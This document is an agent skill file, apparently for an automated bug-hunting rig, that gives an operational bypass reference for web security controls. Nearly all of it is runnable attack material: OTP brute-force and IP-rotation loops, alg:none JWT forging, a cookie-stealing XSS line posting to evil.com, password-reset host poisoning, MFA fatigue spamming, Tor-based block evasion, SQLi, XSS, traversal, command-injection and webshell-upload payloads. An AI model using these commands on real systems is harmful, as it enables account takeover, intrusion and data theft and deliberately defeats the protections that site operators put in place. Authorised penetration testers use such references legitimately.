---
name: bypasses
description: Complete bypass reference — 403 Forbidden bypass (method/header/path/content-type fuzzing, automated tools), 2FA/MFA bypass (response manipulation, OTP brute force, session/token reuse, race conditions), authentication bypass (JWT alg:none/algorithm confusion/kid, OAuth redirect_uri/PKCE/CSRF, session/password reset), WAF, rate-limit, IP block, CAPTCHA, content-type, encoding, filter, upload, and business logic bypass techniques with payloads and tool commands.
category: meta-orchestration
---

# Bypass Arsenal — Complete Reference

## 0. Testing Workflow: Headless Browser vs Curl

### 0.1 The Golden Rule

**ALL requests from headless browsers MUST be captured for analysis** — on this Windows rig use Burp proxy (127.0.0.1:8080), browser devtools HAR export, or Playwright network tracing so every request/response is saved for agent analysis, replay, or scanning.

Agents cannot inspect what they cannot see. Traffic not captured by Playwright interceptors is invisible to the analysis pipeline.

### 0.2 Decision Matrix

| Situation | Use | Why | Capture? |
|-----------|-----|-----|----------|
| REST API endpoint (JSON/XML) | **curl** | Precise control, fast, no overhead | Only if response needs analysis |
| Auth flow (login, signup, OAuth) | **Headless** | Captures cookies, redirects, CSRF tokens, JS challenges | **MANDATORY** |
| JS-heavy SPA / dynamic rendering | **Headless** | Content loaded by JS not returned by curl | **MANDATORY** |
| Simple GET/POST forms | **curl** | Faster, simpler | Optional |
| OAuth callback / SSO redirect chain | **Headless** | Cookie/session management across redirects | **MANDATORY** |
| GraphQL introspection | **curl** | Precise query control, large responses | Optional |
| File upload | **curl** | Binary control, multipart boundary control | Optional |
| CAPTCHA / Turnstile / bot detection | **Headless** | Browser behavior, JS execution, cookies | **MANDATORY** |
| 2FA enrollment / verification | **Headless** | Multi-step UI flows, QR code display | **MANDATORY** |
| Bulk endpoint fuzzing (ffuf/gobuster) | **curl + tools** | Speed, concurrency, precise matching | Only for confirmation |
| Single-page form with CSRF token | **Headless → curl** | Extract token with browser, replay with curl | **MANDATORY** for token extraction |
| WebSocket testing | **Headless** | Browser handles WS handshake natively | **MANDATORY** |
| Login followed by API testing | **Headless → curl** | Browser for login (cookie capture), curl for API | Browser traffic **MANDATORY** |
| SSRF / OOB testing | **curl** | Precise control over OOB payloads | Optional |
| Race condition testing | **curl** | Parallel request control, timing precision | Optional |

### 0.3 How to Capture Headless Browser Traffic

```bash
# Windows rig: run the browser through Burp proxy (127.0.0.1:8080) or enable Playwright network tracing
# so all traffic is captured (HAR / devtools network log)
curl.exe -x http://127.0.0.1:8080 <url>   # or run the page in a Burp-proxied browser

# Read captured traffic
tail -10 ~/hunting-rig-data/default/requests.jsonl | python3 -c "
import sys, json
for line in sys.stdin:
    r = json.loads(line)
    print(f\"{r['method']} {r['url']} → {r.get('responseStatus')}\")"
```

### 0.4 After Browser Capture: Agent Analysis

Once the browser interaction is captured in requests.jsonl, the agent can:

```bash
# 1. View captured requests
tail -5 ~/hunting-rig-data/default/requests.jsonl | python3 -m json.tool

# 2. View requests in Burp (if Burp MCP connected)
# @burp can mine proxy history for:
#   - Tokens (JWT, session cookies, CSRF tokens)
#   - Hidden endpoints/parameters
#   - Secrets in responses
#   - Auth flows
#   - Parameter structures

# 3. Replay requests with Burp Repeater for deep testing
# @burp can send requests to Repeater for manual testing

# 4. The agent analyzes the captured traffic and generates:
#   - Hypothesis: "I believe /api/users/:id is vulnerable to IDOR"
#   - Impact target: "If true, access other users' private data"
```

### 0.5 When NOT to Use a Headless Browser

- **Simple API testing** — curl is faster, lighter, more precise
- **Bulk scanning** — ffuf/nuclei/sqlmap are purpose-built tools
- **Rate limit testing** — precise timing control with curl
- **Large data extraction** — direct API calls are more efficient
- **Binary protocol testing** — WebSocket, gRPC, custom protocols

### 0.6 Common Pitfalls

```
✗ Using curl for JS-heavy SPAs → missing content, wrong tokens
✗ Using headless for bulk fuzzing → 100x slower than ffuf
✗ Browser traffic not captured by interceptors → agent can't analyze it
✗ Using headless without ignoreHTTPSErrors → cert errors
- Not capturing browser traffic (no Burp proxy / no HAR) -> traffic invisible to analysis
```

---

## 1. WAF Bypass

See `waf-bypass` skill for full depth. Quick reference:

| WAF | Technique |
|-----|-----------|
| **Cloudflare** | Origin IP via DNS history (SecurityTrails), HTTP/2 smuggling, Unicode normalization, chunked encoding |
| **Akamai** | Path manipulation (`/..;/`, `/%2e./`), HTTP parameter pollution, case variation |
| **ModSecurity** | Double URL encoding, Unicode, comment injection, boundary confusion |
| **AWS WAF** | IP rotation, request fragmentation, JSON/XML parameter pollution |
| **Generic** | Encoding chains, HTTP method alternation, content-type switching |

### Quick WAF detection
```bash
wafw00f -a https://TARGET.COM
curl -sI https://TARGET.COM | grep -iE 'cf-|akamai|incapsula|cloudfront|x-cdn|x-sucuri'
```

### Origin IP bypass
```bash
# Find real origin IP
curl -s "https://api.securitytrails.com/v1/domain/TARGET.COM" \
  -H "APIKEY: KEY" 2>/dev/null | jq -r '.current_dns.a.values[]' | head -5
# Test direct IP access
curl -H "Host: TARGET.COM" https://ORIGIN_IP/
```

---

## 2. 403 Forbidden Bypass

403 means the server understands the request but refuses to authorize it. Often the result of WAF rules, IP restrictions, or access control misconfigurations — not necessarily a true "block."

### 2.1 HTTP Method Manipulation
Authorization is often method-dependent. A GET may be blocked but POST/PUT/PATCH/DELETE may not.

```bash
# Test all HTTP methods
for method in GET POST PUT PATCH DELETE HEAD OPTIONS CONNECT TRACE; do
  curl -X "$method" -s -o /dev/null -w "%{http_code} %{method}\n" https://TARGET.COM/admin
done

# Lowercase method (bypasses case-sensitive WAF rules)
curl -X "get" https://TARGET.COM/admin
curl -X "post" https://TARGET.COM/admin

# Arbitrary method (some backends accept any string)
curl -X "ANYTHING" https://TARGET.COM/admin
```

### 2.2 Header Injection
Headers that imply internal/local origin are often trusted blindly.

```bash
# IP spoofing headers — try ALL of these
for h in X-Forwarded-For X-Real-IP X-Client-IP X-Cluster-Client-IP \
         X-Originating-IP True-Client-IP Cf-Connecting-Ip \
         X-ProxyUser-Ip Forwarded X-Original-Forwarded-For; do
  curl -H "$h: 127.0.0.1" -s -o /dev/null -w "%{http_code} $h\n" https://TARGET.COM/admin
done

# Internal network ranges
for ip in 127.0.0.1 10.0.0.1 172.16.0.1 192.168.1.1 ::1; do
  curl -H "X-Forwarded-For: $ip" -s -o /dev/null -w "%{http_code} $ip\n" https://TARGET.COM/admin
done

# URL override headers (proxy rewrites the request internally)
curl -H "X-Original-URL: /admin" https://TARGET.COM/
curl -H "X-Rewrite-URL: /admin" https://TARGET.COM/
curl -H "X-Override-URL: /admin" https://TARGET.COM/

# Bot User-Agent spoofing (WAFs often allow search engine crawlers)
for ua in "Googlebot/2.1" "Mozilla/5.0 (compatible; Bingbot/2.0)" \
          "Mozilla/5.0 (compatible; YandexBot/3.0)" "Twitterbot/1.0" \
          "Mozilla/5.0 (compatible; Baiduspider/2.0)"; do
  curl -A "$ua" -s -o /dev/null -w "%{http_code}\n" https://TARGET.COM/admin
done

# Referer spoofing (some apps trust internal referrers)
curl -H "Referer: https://TARGET.COM/" https://TARGET.COM/admin
curl -H "Referer: https://google.com/" https://TARGET.COM/admin

# Host header manipulation
curl -H "Host: localhost" https://TARGET.COM/admin
curl -H "Host: 127.0.0.1" https://TARGET.COM/admin
```

### 2.3 URL & Path Manipulation
WAFs check for exact paths like `/admin`. Tiny variations bypass pattern matching.

```bash
# Path variations to test
paths=(
  /Admin           # Capitalize
  /ADMIN           # All caps
  /aDmIn           # Mixed case
  /admin.          # Trailing dot
  /admin/          # Trailing slash (vs no slash)
  //admin          # Double slash
  /admin..;/       # Semicolon (Tomcat/Apache path normalization)
  /./admin/./      # Current directory dot
  /%2e/admin       # URL-encoded dot
  /%61dmin         # URL-encoded first char
  /%2561dmin       # Double-encoded
  /admin%00        # Null byte
  /admin%20        # Space
  /admin$          # End-of-string
  /admin?          # Query string
  /admin#          # Fragment
  /admin.json      # Extension change
  /admin.html      # Extension change
  /admin/..;/admin # Path traversal within path
  /admi{%}n        # Parameterized path
)

for p in "${paths[@]}"; do
  curl -s -o /dev/null -w "%{http_code} $p\n" "https://TARGET.COM$p"
done

# Wayback Machine historical endpoints (may be unblocked)
# Old endpoints often aren't covered by current WAF rules
curl -s "https://web.archive.org/cdx/search/cdx?url=TARGET.COM/admin&output=text" | head -20

# HTTP/2 bypass (WAF inspects HTTP/1.1 differently)
curl --http2 https://TARGET.COM/admin

# IPv6 bypass (WAF rules may not apply to IPv6)
curl -6 -H "Host: TARGET.COM" https://[IPV6_ADDRESS]/admin

# Different port bypass
curl https://TARGET.COM:8443/admin
```

### 2.4 Content-Type & Body Manipulation
Some WAFs only inspect specific content types.

```bash
# Switch content type entirely
curl -H "Content-Type: application/xml" -X POST -d '<root/>' https://TARGET.COM/admin
curl -H "Content-Type: application/json" -X POST -d '{}' https://TARGET.COM/admin
curl -H "Content-Type: text/plain" -X POST -d '' https://TARGET.COM/admin
curl -X OPTIONS https://TARGET.COM/admin  # OPTIONS often unblocked

# Transfer-Encoding chunked (bypasses body inspection)
printf "POST /admin HTTP/1.1\r\nHost: TARGET.COM\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n" | nc TARGET.COM 443

# HTTP/1.0 downgrade (weaker WAF rules for legacy protocol)
printf "GET /admin HTTP/1.0\r\nHost: TARGET.COM\r\n\r\n" | nc TARGET.COM 443
```

### 2.5 403 Bypass Automation
```bash
# Install and run 403 bypass tools
git clone https://github.com/yunemse48/403bypasser 2>/dev/null
python3 403bypasser.py -u https://TARGET.COM/admin --http2 --waf-detect --wayback

git clone https://github.com/lobuhi/byp4xx 2>/dev/null
bash byp4xx.sh https://TARGET.COM/admin

# Burp Autorize extension — auto-swaps auth tokens between users
# Burp 403 Bypasser extension — automated header/method/encoding fuzzing
```

### 2.6 403 Bypass Decision Checklist
```
□ Method fuzzing (GET/POST/PUT/PATCH/DELETE/HEAD/OPTIONS + lowercase + arbitrary)
□ IP spoofing headers (X-Forwarded-For, X-Real-IP, X-Client-IP + all variants)
□ URL override headers (X-Original-URL, X-Rewrite-URL, X-Override-URL)
□ Bot User-Agent spoofing (Googlebot, Bingbot, YandexBot, Baiduspider)
□ Referer spoofing (internal referrer, search engine referrer)
□ Host header manipulation (localhost, 127.0.0.1, internal hostname)
□ Path variations (case/encode/dots/slashes/semicolons/nullbyte)
□ Content-type switch (JSON/XML/Form/Text/Chunked)
□ HTTP version downgrade (HTTP/1.0, HTTP/2)
□ Protocol switch (IPv6, different port)
□ Wayback historical endpoints (old unblocked paths)
□ HTTP request smuggling (CL.TE, TE.CL)
□ Parameter pollution (duplicate params)
```

---

## 3. 2FA / MFA Bypass

2FA/MFA bypasses exploit implementation flaws in the multi-factor flow — not the strength of the factor itself.

### 3.1 Response Manipulation
The client-side code decides whether 2FA is required based on the server response. Modify the response to bypass.

```bash
# In Burp: Intercept the response after login
# Change: HTTP/1.1 400 Bad Request → HTTP/1.1 200 OK
# Change: {"requires_2fa": "GoogleAuthenticator"} → {"requires_2fa": null}
# Change: {"status": "challenge"} → {"status": "success"}
# Change: {"verified": false} → {"verified": true}

# In Burp Proxy: Intercept Response, modify status code + body
# Or use Match & Replace: replace "400" with "200" automatically
```

### 3.2 Password Reset / Alternative Flow Bypass
The password reset flow often skips 2FA entirely.

```bash
# Test: reset password via "forgot password" → set new password → login
# If no 2FA challenge after reset → 2FA bypass via password reset

# Test: OAuth/SSO login may skip 2FA
# If login with Google/GitHub/Facebook bypasses 2FA → ATO via SSO compromise

# Test: mobile app / API client may not enforce 2FA
# Capture the mobile app login request and replay via Burp
```

### 3.3 OTP Brute Force & Rate Limit Bypass
OTPs are 4-6 digits → brute-forceable if rate limiting is weak or per-IP.

```bash
# Standard OTP brute force (6-digit, no rate limit = 1M combos)
for code in $(seq 0 9999); do  # 4-digit first
  curl -X POST "https://TARGET.COM/api/2fa/verify" \
    -d "code=$(printf '%04d' $code)&token=TOKEN" \
    -o /dev/null -s -w "%{http_code} %{size_download}B\n"
done | sort | uniq -c | sort -rn

# Rate limit bypass via IP rotation
# Windows: rotate IP via a fresh Tor circuit or proxy pool; resets the attempt counter
# Or use X-Forwarded-For rotation (if rate limit is per-IP based on headers)
for i in $(seq 1 100); do
  curl -H "X-Forwarded-For: 10.0.0.$i" -d "code=$i" https://TARGET.COM/api/2fa/verify
done

# OTP via response manipulation (code validation in frontend only)
# Try submitting wrong OTP → intercept response → change 400 → 200
```

### 3.4 Session & Token Reuse
Old sessions and tokens often bypass 2FA after initial enrollment.

```bash
# Test: login → enable 2FA → use pre-2FA session cookie
# If old session still works → 2FA is cosmetic only

# Test: login → close browser → open new browser → use old session token
# If session not invalidated after 2FA boundary → bypass

# Test: generate password reset link BEFORE enabling 2FA
# Enable 2FA → still use the pre-2FA reset link (old link not invalidated)

# Test: backup codes — try using same backup code twice
# Test: backup codes — check if they have shorter expiry or weaker validation
```

### 3.5 Race Condition & State Confusion

```bash
# Race condition: initiate 2FA enrollment in two tabs simultaneously
# Tab 1: start 2FA enrollment
# Tab 2: complete login flow with partial session
# If race window exists → 2FA state may be bypassed

# MFA fatigue: spam push notifications until victim approves
# Log in repeatedly (20-50 times) → victim may accidentally approve one

# Step-skipping: navigate directly to post-2FA URL after login
# After password login, try requesting dashboard/API directly
curl -H "Cookie: session=TOKEN" https://TARGET.COM/api/dashboard
```

### 3.6 2FA Bypass Checklist
```
□ Response manipulation (400→200, requires_2fa→null, challenge→success)
□ Password reset flow bypass (does reset skip 2FA?)
□ OAuth/SSO flow bypass (does social login skip 2FA?)
□ Mobile app / API client bypass (alternative client no 2FA?)
□ OTP brute force (rate limit present? per-IP? per-session?)
□ OTP rate limit bypass (IP rotation, header spoofing)
□ Pre-2FA session reuse (old session still valid after enabling 2FA)
□ Pre-2FA token reuse (password reset link from before 2FA still works)
□ Backup code validation flaws (reuse, expiry, strength)
□ Race condition during 2FA enrollment
□ MFA fatigue (push notification spam)
□ Direct post-2FA endpoint access (skip intermediate step)
□ Chrome extension / alternative client bypass
□ Temporary lockout → re-login drops 2FA
□ SIM swap (if SMS-based — requires carrier social engineering)
□ IP whitelist / trusted location bypass (if conditional access)
```

---

## 4. Authentication Bypass (JWT / OAuth / Session)

See `auth-bypass-session` skill for full depth. Quick reference below.

### 4.1 Direct Endpoint Access
```bash
# Common paths often missing auth middleware
/api/admin/users
/api/internal/health
/api/v1/admin
/internal/graphql
/debug
/.env
/swagger.json
/api-docs
/graphql?query={__schema{types{name}}}
```

### 4.2 JWT Attacks
```bash
# 1. alg:none bypass — remove signature entirely
python3 -c "import base64, json
h = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).rstrip(b'=').decode()
print(f'{h}.{p}.')"

# Try case variants: none, None, NONE, nOnE, NoNe

# 2. Algorithm confusion (RS256→HS256)
# Find public key (often at /.well-known/jwks.json)
curl https://TARGET.COM/.well-known/jwks.json
# Sign token with public key as HMAC secret
python3 jwt_tool.py TOKEN -X a -k public.pem

# 3. Weak secret cracking with hashcat
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0." > /tmp/jwt.txt
hashcat -m 16500 /tmp/jwt.txt /usr/share/wordlists/rockyou.txt --force
# Mode 16500 = JWT HMAC cracking

# 4. kid injection (path traversal or SQLi in Key ID)
# kid: "../../etc/passwd"
# kid: "|sqlite3 /db.sqlite \"SELECT key FROM keys\""
python3 -c "import base64, json
h = base64.urlsafe_b64encode(json.dumps({'alg':'HS256','typ':'JWT','kid':'../../etc/passwd'}).encode()).rstrip(b'=').decode()
print(h)"

# 5. jku / x5u injection (JWK Set URL)
# Point jku to attacker-controlled JWKS endpoint
```

### 4.3 OAuth Bypass

```bash
# Missing state parameter → CSRF on OAuth → account linking ATO
# If no state: attacker initiates OAuth with their account, captures callback URL,
# tricks victim into visiting it, victim's account links to attacker's OAuth identity

# redirect_uri bypass patterns
# Test all 7 patterns:
# 1. Path traversal: /oauth/callback/../attacker.com
# 2. Query injection: /oauth/callback?redirect=https://attacker.com
# 3. Subdomain: attacker.target.com/oauth/callback
# 4. @ confusion: https://target.com@attacker.com
# 5. URL encoding: /oauth/callback%2f..%2f..%2fattacker
# 6. Extra slashes: //attacker.com/oauth/callback
# 7. localhost: http://localhost:8080/oauth/callback

# PKCE bypass (if attacker controls the authorization URL):
# Generate own PKCE pair, include codeChallenge in SSO URL
# If SSO can be embedded in iframe → zero-click code theft

# Referer leakage (code in URL + third-party scripts)
# If authorization code appears in callback URL and page loads GA/Facebook/etc.
# → code sent to third parties via Referer header

# Static state parameter (present but predictable)
# Capture state value, reuse it across sessions → CSRF still possible
```

### 4.4 Session Attacks
```bash
# Session fixation: set session cookie before login
curl -H "Cookie: session=ATTACKER_SESSION" -X POST https://TARGET.COM/login \
  -d "user=victim&pass=password"
# If server doesn't rotate session on login → attacker uses same session after auth

# Session token theft via XSS
<script>fetch('https://evil.com/?c='+document.cookie)</script>

# Session token in URL (Referer leakage)
# If session token in URL params → leaks via Referer to third-party resources

# Session timeout not enforced
# Capture a session, wait hours/days, still valid → no expiry check

# Refresh token rotation bypass
# If refresh token doesn't rotate on use → replay attack
```

### 4.5 Password Reset Poisoning
```bash
# Host header injection in reset email link
curl -X POST https://TARGET.COM/api/reset \
  -H "Host: ATTACKER.com" \
  -d "email=user@target.com"
# Reset link goes to: http://ATTACKER.com/reset?token=XXXX
# Attacker captures token from their server logs

# X-Forwarded-Host injection
curl -X POST https://TARGET.COM/api/reset \
  -H "X-Forwarded-Host: ATTACKER.com" \
  -d "email=user@target.com"

# Email parameter manipulation
# Try multiple "email" fields
curl -X POST https://TARGET.COM/api/reset \
  -d "email=victim@target.com&email=attacker@evil.com"
```

---

## 5. Rate-Limit Bypass

### IP rotation
```bash
# Tor circuit cycling
curl.exe --socks5-hostname 127.0.0.1:9050 https://api.ipify.org   # cycle Tor circuit for a fresh IP

# Route through Tor for specific tools
curl --socks5-hostname 127.0.0.1:9050 https://TARGET.COM
ffuf -x socks5://127.0.0.1:9050 -u https://TARGET.COM/FUZZ -w wordlist.txt
nuclei -proxy socks5://127.0.0.1:9050 -u https://TARGET.COM

# Proxy pool (fallback if Tor down)
# fetch fresh proxies into a file (e.g. proxylistupdate), then curl.exe --proxy <entry>
proxychains4 curl https://TARGET.COM
```

### Header-based bypass
```bash
# X-Forwarded-For rotation
curl -H "X-Forwarded-For: $RANDOM.$RANDOM.$RANDOM.$RANDOM" https://TARGET.COM

# X-Real-IP variation
curl -H "X-Real-IP: 10.0.0.$i" https://TARGET.COM

# X-Originating-IP
curl -H "X-Originating-IP: $RANDOM_IP" https://TARGET.COM

# Client-IP
curl -H "Client-IP: $RANDOM_IP" https://TARGET.COM
```

### Timing-based bypass
```bash
# Slow down requests (1-2 req/s)
for url in $(cat urls.txt); do sleep 1; curl -s "$url" & done; wait

# Burst with long pauses between bursts
for i in 1 2 3; do
  curl -s "https://TARGET.COM/api/endpoint"
done
sleep 60
```

### Method/parameter alternation
```bash
# Sometimes rate limits are per-method
curl -X POST https://TARGET.COM/api/endpoint  # POST might be unlimited vs GET

# Add random params to bypass cache-based rate limits
curl "https://TARGET.COM/api/endpoint?_=$(date +%s%N)"
```

### Session-based bypass
```bash
# Some rate limits are per-session
for i in $(seq 1 10); do
  SESSION="session_$i"
  curl -H "Cookie: session=$SESSION" https://TARGET.COM/api/endpoint
done
```

---

## 6. CAPTCHA Bypass

See `captcha-handling` skill for full depth.

| Type | Approach |
|------|----------|
| Text CAPTCHA | OCR with tesseract |
| Math/logic | Solve programmatically |
| Honeypot | Don't fill hidden fields |
| reCAPTCHA v2 | Hard — switch flow |
| reCAPTCHA v3 | Try realistic browser behavior (headers, timing) |
| Turnstile | Try with proper browser UA + headers, sometimes auto-passes |

---

## 7. IP Block Bypass

### Tor (built-in)
```bash
curl.exe --socks5-hostname 127.0.0.1:9050 https://api.ipify.org   # check your Tor IP
curl.exe --socks5-hostname 127.0.0.1:9050 https://api.ipify.org   # cycle to a new Tor circuit for a fresh IP
curl.exe --socks5-hostname 127.0.0.1:9050 https://check.torproject.org/api/ip   # verify Tor works
```

### Proxy pool
```bash
# fetch fresh proxies into a file (e.g. proxylistupdate), then curl.exe --proxy <entry>
# Uses proxychains round-robin after fetch
```

### Headers (some CDNs trust these)
```bash
# AWS CloudFront
curl -H "X-Forwarded-For: $IP" https://TARGET.COM
# Cloudflare
curl -H "Cf-Connecting-Ip: $IP" https://TARGET.COM
# Akamai
curl -H "True-Client-Ip: $IP" https://TARGET.COM
```

### Alternative infra
```bash
# IPv6 (if target supports it)
curl -6 https://TARGET.COM

# HTTP/2 or HTTP/3 (downgrade/upgrade)
curl --http2 https://TARGET.COM
curl --http3 https://TARGET.COM

# Different port (443 vs 8443 vs 8080)
curl https://TARGET.COM:8443
```

---

## 8. Content-Type Bypass

### Switch content types to bypass WAF rules

| Source | Target | Example |
|--------|--------|---------|
| JSON | XML | `curl -H "Content-Type: application/xml" -d '<root><id>1</id></root>'` |
| XML | JSON | `curl -H "Content-Type: application/json" -d '{"id":1}'` |
| JSON | Form | `curl -H "Content-Type: application/x-www-form-urlencoded" -d 'id=1'` |
| Form | Multipart | `curl -F "id=1"` |

### Content-Type manipulation
```bash
# Add charset
Content-Type: application/json; charset=utf-7

# Case variation
content-type: Application/JSON

# Duplicate Content-Type header
Content-Type: application/x-www-form-urlencoded
Content-Type: application/json

# Boundary manipulation (multipart)
Content-Type: multipart/form-data; boundary=ARBITRARY
```

### Serialization switching
```bash
# PHP serialization
curl -d 'data=O:1:"A":1:{s:1:"x";s:5:"hello";}' https://TARGET.COM

# YAML
curl -d 'data: !<tag:yaml.org,2002:java/execute> "cmd"' https://TARGET.COM
```

---

## 9. Encoding Bypass

### URL encoding chain
```bash
# Single encode: %22
"                          -> %22
# Double encode: %2522
%22                        -> %2522
# Triple encode: %252522
%2522                      -> %252522

# Unicode UTF-8 encoding
<iframe>                   -> %u003Ciframe%u003E
# Unicode overlong
<                          -> %C0%BC (overlong for <)
# Unicode normalization
<script>                   -> %u0073cript
```

### Mixed encoding bypass
```bash
# Mix URL + Unicode + Hex in one payload
%u0027 OR 1=1--            # SQLi with Unicode quote
\x27 OR 1=1--              # Hex-encoded quote
%2527 OR 1=1--             # Double-encoded quote

# Case variation
<ScRiPt>alert(1)</ScRiPt>  # XSS with mixed case
<SCRIPT>alert(1)</SCRIPT>  # All caps bypass lowercase filters
```

### Null byte injection
```bash
# Terminate strings early
../../../etc/passwd%00.txt
../../../etc/passwd%00.html

# PHP-based: null byte in file operations
file.php%00.txt
file.php%00.bak
```

### Whitespace bypass
```bash
# Tab instead of space
UNION/**/SELECT/**/1,2,3--

# Newline
UNION%0aSELECT%0a1,2,3--

# Comment injection
SEL/**/ECT 1,2,3--         # SQLi keyword splitting
<scr/**/ipt>alert(1)</scr/**/ipt>  # XSS keyword splitting
```

### Unicode normalization bypass
```bash
# Full-width characters (bypass keyword filters)
ＳＥＬＥＣＴ * FROM users   # Full-width SQL keywords
＜ｓｃｒｉｐｔ＞alert(1)＜／ｓｃｒｉｐｔ＞  # Full-width XSS

# UTF-7 encoding
+ADw-script+AD4-alert(1)+ADw-/script+AD4-  # IE/old browser XSS

# Unicode dot bypass (for SSRF/path traversal)
127.0.0.1 -> ①②⑦⓿⓿❶        # Unicode digits bypass IP filters
```

---

## 10. Filter Bypass (Keyword/Character)

### SQLi keyword bypass
```bash
# UNION bypass
UNION DISTINCT SELECT
UNION ALL SELECT
UNION/**/SELECT
UNION%0aSELECT

# OR/AND bypass
||  instead of OR
&&  instead of AND

# Comment-based splitting
SEL/**/ECT 1,2,3
INS/**/ERT INTO
/**/OR/**/1=1

# Hex encoding of keywords
0x756E696F6E  -> "union" in hex
0x73656C656374 -> "select" in hex
```

### XSS filter bypass
```bash
# Event handler alternatives
onfocus=alert(1) autofocus
onmouseover=alert(1)
onerror=alert(1)

# Tag alternatives
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
<marquee onstart=alert(1)>

# Without parentheses
<script>alert`1`</script>   # Template literals
<script>alert(1)</script>    # Normal
<svg><script>alert(1)</script>  # Nested

# Protocol bypass
javascript:alert(1)
JaVaScRiPt:alert(1)
&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116:alert(1)

# Data URI bypass
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmk+cHQ+YWxlcnQoMSk8L3NjcmlwdD4=
```

### Path traversal bypass
```bash
# Simple
../../../etc/passwd

# Double dot encoding
..%252f..%252f..%252fetc/passwd

# Unicode encoding
..%c0%af..%c0%af..%c0%afetc/passwd

# Path truncation
../../../etc/passwd.............[many dots]

# Null byte
../../../etc/passwd%00.jpg

# Mixed encoding chain
..%252f..%252f..%252fetc%252fpasswd
..%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
```

### Command injection bypass
```bash
# Space bypass
;id
|id
`id`
$(id)
{id,whoami}

# Keyword bypass (when common commands blocked)
whoami -> who$()ami, who""ami, who'am'i, w\ho\am\i
cat    -> c'a't, c""at, ${PATH:0:1}at
/bin/sh -> /b'i'n/sh, /bin/s\h

# Newline as command separator
%0aid
%0a/usr/bin/id

# Tab instead of space
;id\twhoami
```

---

## 11. Upload Bypass

See `upload-bypass` skill for full depth (572 lines).

### Quick bypass chain
```bash
# 1. Extension bypass
file.php, file.pHp, file.php5, file.phtml, file.php.jpg, file.php%00.jpg

# 2. Content-type manipulation
Content-Type: image/jpeg
Content-Type: image/png

# 3. Magic bytes prepend
echo -e '\xFF\xD8\xFF\xE0' > shell.jpg.php

# 4. Race condition (TOCTOU)
# Upload valid file → simultaneous access before cleanup
```

---

## 12. Business Logic Bypass

### Workflow step-skipping
```bash
# Skip payment step in checkout
curl -X POST https://TARGET.COM/api/checkout/complete \
  -H "Authorization: Bearer TOKEN" \
  -d '{"order_id": "123", "skip_payment": true}'

# Go directly to final step of multi-step wizard
curl -X POST https://TARGET.COM/api/wizard/step3 \
  -H "Authorization: Bearer TOKEN" \
  -d '{"data": "..."}'
```

### Negative/overflow values
```bash
# Negative quantity (refund without payment)
curl -X POST https://TARGET.COM/api/cart/add \
  -d '{"product_id": 1, "quantity": -100}'

# Integer overflow
{"quantity": 9999999999999999999}
{"price": -1}
{"discount": 999999}
```

### State manipulation
```bash
# Reuse consumed coupon/token
curl -X POST https://TARGET.COM/api/coupon/redeem \
  -d '{"code": "ALREADY_USED_CODE"}'

# Vertical privilege escalation
# Change role in profile update
curl -X PUT https://TARGET.COM/api/user/profile \
  -d '{"role": "admin"}'
```

---

## Quick Reference: Bypass Decision Tree

```
Testing blocked?
├── HTTP 403 (Forbidden)
│   ├── [§2.1] Method fuzzing (GET/POST/PUT/DELETE/PATCH/HEAD/OPTIONS)
│   ├── [§2.2] Header injection (X-Forwarded-For, X-Original-URL, bot UAs)
│   ├── [§2.3] Path manipulation (encode/case/dots/slashes/semicolons/H2/IPv6)
│   ├── [§2.4] Content-type switch (XML/JSON/Form/Chunked/HTTP/1.0)
│   └── [§2.5] Automated tools (403bypasser, byp4xx)
├── HTTP 429 (Rate limit)
│   ├── [§5.1] IP rotation (Tor/proxy pool)
│   ├── [§5.2] Header spoofing (X-Forwarded-For rotation)
│   ├── [§5.3] Slow down / burst with pauses
│   ├── [§5.4] Method/parameter alternation
│   └── [§5.5] Session rotation
├── HTTP 401 (Auth required)
│   ├── [§4.2] JWT attacks (alg:none, algorithm confusion, weak secret, kid)
│   ├── [§4.3] OAuth bypass (missing state, redirect_uri, PKCE)
│   ├── [§4.4] Session attacks (fixation, token theft, timeout bypass)
│   ├── [§4.1] Direct endpoint access (missing middleware)
│   └── [§4.5] Password reset poisoning
├── 2FA/MFA challenge
│   ├── [§3.1] Response manipulation (400→200, requires_2fa→null)
│   ├── [§3.2] Alternative flow (password reset, OAuth, mobile app)
│   ├── [§3.3] OTP brute force + rate limit bypass
│   ├── [§3.4] Session/token reuse (pre-2FA session, backup codes)
│   └── [§3.5] Race condition / MFA fatigue / step-skipping
├── Payload blocked (WAF/filter)
│   ├── [§9] Encoding chain (double/unicode/hex/base64)
│   ├── [§10] Keyword splitting (comments/newlines/tabs/case)
│   ├── [§8] Content-type switch
│   ├── [§7] IP rotation + header spoofing
│   └── [§2.4] Chunked encoding / HTTP/1.0 downgrade
└── CAPTCHA
    ├── [§6] Text CAPTCHA → OCR
    ├── [§6] Math/logic CAPTCHA → programmatic solve
    ├── [§6] Turnstile/reCAPTCHA v3 → realistic browser behavior
    └── [§6] reCAPTCHA v2/hCaptcha → switch flow/endpoint
```
